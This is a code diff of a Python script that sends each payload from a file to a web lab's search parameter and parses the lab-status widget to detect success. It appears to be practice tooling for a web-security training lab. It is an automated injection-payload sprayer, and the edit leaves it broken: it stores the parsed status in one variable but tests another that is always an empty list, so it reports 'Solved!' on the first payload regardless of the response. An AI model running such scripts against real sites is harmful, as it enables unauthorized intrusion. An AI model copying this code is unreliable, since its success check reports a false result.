@@ -26,20 +26,20 @@ with open("payload.txt") as f:
 # establishing session for uniformity of request sequences
 session = requests.session()
 for exploit_payload in payload_list:
-    crafted_request = session.get(base_url + "/?search=%s" % exploit_payload)
+    attack_request = session.get(base_url + "/?search=%s" % exploit_payload)
     # now check whether problem got solved ???
-    is_solved = crafted_request.text
+    # is_solved = crafted_request.text
+    is_solved = session.get(base_url)
     result = []
-    soup = BeautifulSoup(is_solved, features="lxml")
-    result = soup.find("div", {"class" : "widgetcontainer-lab-status is-notsolved"})
+    soup = BeautifulSoup(is_solved.text, features="lxml")
+    data = soup.find("div", {"class" : "widgetcontainer-lab-status is-solved"})
 
-    if result is not None:
+    if result is None:
         print("Not Solved! :( ")
-        print(exploit_payload)
         print("Trying out more payloads from the payload.txt file...")
         continue
     else:
-        print("Solved!!! :) ")
+        print("\nSolved!!! :) ")
         print("Working payload(exploit) is: %s" % exploit_payload)
         break
     
